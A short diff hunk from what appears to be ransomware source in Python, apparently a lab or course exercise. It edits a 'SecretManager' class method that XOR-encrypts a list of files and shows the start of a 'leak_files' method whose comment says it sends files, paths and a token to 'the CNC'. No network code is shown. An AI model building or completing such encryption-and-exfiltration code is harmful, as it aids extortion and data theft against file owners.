@@ -148,13 +148,12 @@ class SecretManager:
         hex_token = hex_token.hex()
         return hex_token
 
-    def xorfiles(self, files:List[str])->dict: #None ?:
+    def xorfiles(self, files:List[str])->None :
         # xor a list for file
         files_encrypted = {}
         for file in files:
             files_encrypted[str(file)] = xorfile(file, self._key)
 
-        return files_encrypted
 
     def leak_files(self, files:List[str])->None:
         # send file, geniune path and token to the CNC
